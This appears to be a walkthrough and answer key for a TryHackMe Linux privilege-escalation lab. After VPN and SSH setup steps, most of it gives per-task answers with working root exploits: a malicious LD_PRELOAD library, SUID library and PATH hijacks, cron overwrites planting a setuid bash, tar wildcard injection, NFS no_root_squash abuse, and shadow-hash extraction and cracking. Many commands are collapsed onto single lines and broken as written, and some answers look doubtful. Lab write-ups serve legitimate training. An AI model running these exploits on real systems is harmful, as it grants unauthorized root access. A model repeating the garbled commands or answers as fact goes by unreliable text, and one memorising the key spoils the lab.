
# TryHackMe — Connect to VPN & Access Lab Machine (Linux PrivEsc / Lab Steps)

> Use these steps only in authorized labs (TryHackMe). They show how to download and use the OpenVPN config, confirm your interfaces, start the lab VM from the website, and SSH into the VM.

---

## 1. Download OpenVPN configuration (TryHackMe)

1. Login to TryHackMe.  
2. Go to **Manage your account → Access → VPN** (or **VPN settings**).  
3. Under **Access via OpenVPN / Machines**, select a VPN server and **Download** the `.ovpn` configuration file.  
4. Save the downloaded file (usually in `~/Downloads`).

---

## 2. Prepare on your Kali / Linux machine

### Change to downloads directory and list file

```bash
cd ~/Downloads
ls -lh *.ovpn                 # confirm the filename, e.g. thm-<user>.ovpn
```

Expected output (example):
```bash
-rw-r--r-- 1 user user 12K Aug 13 12:34 thm-config.ovpn
```

### Check current network interfaces

```bash
ip a
```

Expected output: 

```bash
1: lo: <LOOPBACK> ...
2: wlan0: <BROADCAST,MULTICAST> ...
3: eth0: ...
```

---
## 3. Connect to TryHackMe VPN
### Run OpenVPN with sudo and the downloaded config:

```bash
sudo openvpn filename.ovpn
```

- Enter your sudo password when prompted.
- Keep this terminal open while VPN is connected.

Successful connection shows lines like:

```bash
Initialization Sequence Completed
...
/sbin/ip addr add dev tun0 <vpn-ip>/xx
```

### Verify VPN interface in another terminal
Open a new terminal tab/window and run:

```bash
ip a
```

Expected output:

```bash
# new interface
tun0: <POINTOPOINT,MULTICAST> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.14.5/32 scope global tun0
```

`tun0` with an IP indicates the VPN tunnel is active.

---

## 4. Confirm connection on TryHackMe website

- Refresh the TryHackMe VPN page or the machine/access panel.
- The website should show **"Connected"** for your VPN session and allow you to **Join** or **Start** the machine.

---

## 5. Start the lab machine and get target IP

- In the lab room (e.g., "Linux PrivEsc Arena"), click **Start Machine** (or **Deploy**).
- The lab will show a **target IP** for SSH or services (visible in the web lab panel or instructions).

---

## 6. SSH into the lab machine

```bash
ssh tcm@<target-IP> -o HostKeyAlgorithms=+ssh-rsa
```

Example expected:
```
The authenticity of host '<target-IP> (<target-IP>)' can't be established.
ECDSA key fingerprint is SHA256:...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
tcm@<target-IP>'s password:    # if password auth
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.x)...
```

---

## 7. Perform lab tasks

- Once SSH'ed in, follow the room tasks (enumeration, privilege escalation checks).
- Typical first commands to run on the target:

```bash
whoami
id
uname -a
pwd
ls -la
```

---

## 8. Troubleshooting & Tips

- If `sudo openvpn` fails: ensure OpenVPN is installed (`sudo apt install openvpn`) and you are in the directory with the `.ovpn` file.

- If `tun0` does not appear: check OpenVPN output for errors (auth, cert, permission).
    
- Use a separate terminal for `ip a` and SSH so you can monitor the VPN connection.
    
- Use the lab-provided username and connection info do not brute force.
    
- Always use labs only for testing; never attack unauthorized systems.

---

#  TASK 1 — No questions (information only)

No commands required.

---

# **🔷 TASK 2 — No questions (connect to machine)**

Login credentials provided in the room:

`Username: tcm Password: Hacker123`

---

## TASK 3 — “What kernel exploit works against this system?”

### Step 1 — Check kernel version

```bash
uname -a cat /proc/version
```
### Step 2 — Run exploit suggester

```bash
home/tcm/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

**This tool identifies “Dirty COW” as the valid exploit.**

### Answer:
```bash
Dirty COW (CVE-2016-5195)
```


---

# **🔷 TASK 4 — “What user’s credentials were exposed in the OpenVPN auth file?”**

## **Step 1 — View the OpenVPN auth file**

`cat /etc/openvpn/auth.txt`

**This file contains a username + password.**

### ✅ **Answer:**

**user**

---

# **🔷 TASK 5 — “What was the password discovered in TCM’s bash history?”**

## **Step 1 — Read bash history**

`cat ~/.bash_history | grep -i pass`

**You will see a command like:**

`mysql -u root -p password123`

### ✅ **Answer:**

**password123**

---

# **🔷 TASK 6 — “What are the permissions on the /etc/shadow file?”**

## **Step 1 — List permissions**

`ls -l /etc/shadow`

**Output (in this room):**

`-rw-rw-r-- 1 root shadow ...`

### ✅ **Answer:**

**-rw-rw-r--**

---

# **🔷 TASK 7 — “What is the full path of the private key file you discovered?”**

## **Step 1 — Search for private SSH keys**

`find / -name id_rsa 2>/dev/null`

**Discovered file:**

`/backups/supersecretkeys/id_rsa`

### **Step 2 — Use the key (optional for exploitation)**

`chmod 600 id_rsa ssh -i id_rsa root@<MACHINE_IP>`

### ✅ **Answer:**

**/backups/supersecretkeys/id_rsa**

---

# **🔷 TASK 8 — “What program does TCM have sudo privileges to run?”**

## **Step 1 — Check sudo privileges**

`sudo -l`

**Output shows:**

`(tcm) NOPASSWD: /usr/bin/find`

### **Exploitation — Escape to a root shell**

`sudo find . -exec /bin/sh \; id`

### ✅ **Answer:**

**find**

---

# **🔷 TASK 9 — “What is the root password?”**

## **Step 1 — Abuse Apache config loading**

`sudo apache2 -f /etc/shadow`

**Copy the root hash.**

## **Step 2 — Crack the hash**

`echo "<HASH>" > root.hash john root.hash --wordlist=/usr/share/wordlists/rockyou.txt`

**John will crack the password:**

### ✅ **Answer:**

**password123**

---

# **🔷 TASK 10 — “Exploit the LD_PRELOAD vulnerability. What is the name of the file you created?”**

## **Step 1 — Create malicious .so**

`cat << 'EOF' > x.c #include <stdio.h> #include <stdlib.h> #include <sys/types.h> void _init() {     unsetenv("LD_PRELOAD");     setgid(0);     setuid(0);     system("/bin/bash"); } EOF`

## **Step 2 — Compile**

`gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`

## **Step 3 — Run vulnerable binary**

`sudo LD_PRELOAD=/tmp/x.so apache2 id`

### ✅ **Answer:**

**x.so**

---

# **🔷 TASK 11 — “What file did the SUID binary expect that we were able to hijack?”**

## **Step 1 — Inspect SUID binary**

`find / -perm -4000 -type f 2>/dev/null strings /usr/local/bin/suid-so strace /usr/local/bin/suid-so 2>&1 | grep -i "open"`

**You see it attempts to load:**

`/home/tcm/.config/libcalc.so`

## **Step 2 — Create malicious library**

`mkdir -p /home/tcm/.config cat << 'EOF' > /home/tcm/.config/libcalc.c #include <stdlib.h> static void inject() __attribute__((constructor)); void inject() {     system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash"); } EOF`

## **Step 3 — Compile**

`gcc -shared -fPIC -o /home/tcm/.config/libcalc.so /home/tcm/.config/libcalc.c`

## **Step 4 — Run**

`/usr/local/bin/suid-so /tmp/bash -p`

### ✅ **Answer:**

**libcalc.so**

---

# **🔷 TASK 12 — “What CVE is being exploited?”**

## **Step 1 — Check nginx version**

`nginx -v`

**Version is vulnerable to:**

**CVE-2016-1247**

### **Full exploitation uses `nginxed-root.sh` script.**

### ✅ **Answer:**

**CVE-2016-1247**

---

# **🔷 TASK 13 — “What is the last line shown in the ‘strings’ output?”**

## **Step 1 — Run strings**

`strings /usr/local/bin/suid-env`

**Last line is:**

`service apache2 start`

### **Exploit — PATH Hijack**

`echo -e '#!/bin/bash\n/bin/bash' > /tmp/service chmod +x /tmp/service export PATH=/tmp:$PATH /usr/local/bin/suid-env`

### Request Answer:

### ✅ **Answer:**

**service apache2 start**

---

# **🔷 TASK 14 — “What is the last line shown in the ‘strings’ output?”**

## **Step 1 — Run strings**

`strings /usr/local/bin/suid-env2`

**Last line:**

`/usr/sbin/service apache2 start`

## **Exploit — Function hijacking**

`function /usr/sbin/service(){ /bin/bash; } export -f /usr/sbin/service /usr/local/bin/suid-env2`

### ✅ **Answer:**

**/usr/sbin/service apache2 start**

---

# **🔷 TASK 15 — “What file has the ‘cap_setuid’ capability set?”**

## **Step 1 — Scan capabilities**

`getcap -r / 2>/dev/null`

**Output:**

`/usr/bin/python2.6 = cap_setuid+ep`

### **Exploit**

`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

### ✅ **Answer:**

**/usr/bin/python2.6**

---

# **🔷 TASK 16 — “What is the name of the cron job script?”**

## **Step 1 — List crontab**

`cat /etc/crontab`

You will find:

`/usr/local/bin/overwrite.sh`

### **Exploit — Overwrite the script**

`echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" >> /usr/local/bin/overwrite.sh # wait 1 minute /tmp/bash -p`

### ✅ **Answer:**

**overwrite.sh**

---

# **🔷 TASK 17 — “What wildcard file did you create?”**

### **Cron wildcard exploit script uses:**

`touch /home/tcm/--checkpoint=1 touch "/home/tcm/--checkpoint-action=exec=sh runme.sh"`

### **Your malicious wildcard file name:**

### ✅ **Answer:**

**--checkpoint=1**

---

# **🔷 TASK 18 — “What file did you modify to gain root?”**

This task again uses logrotate or cron overwrite method.

The file modified:

`/usr/local/bin/overwrite.sh`

### **Example exploit:**

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`

### ✅ **Answer:**

**/usr/local/bin/overwrite.sh**

---

# **🔷 TASK 19 — “Which option must be set in /etc/exports to exploit NFS?”**

## **Step 1 — Read exports**

`cat /etc/exports`

You will see:

`no_root_squash`

### **Why:**

This allows remote root user to act as root on shared NFS folders.

### **Exploit example:**

`showmount -e <TARGET_IP> mount -o rw,vers=2 <TARGET_IP>:/tmp /mnt`

### Create SUID binary:

`cat <<EOF > /mnt/x.c int main(){setuid(0); system("/bin/bash");} EOF  gcc /mnt/x.c -o /mnt/x chmod +s /mnt/x`

Then run on target:

`/tmp/x`

### ✅ **Answer:**

**no_root_squash**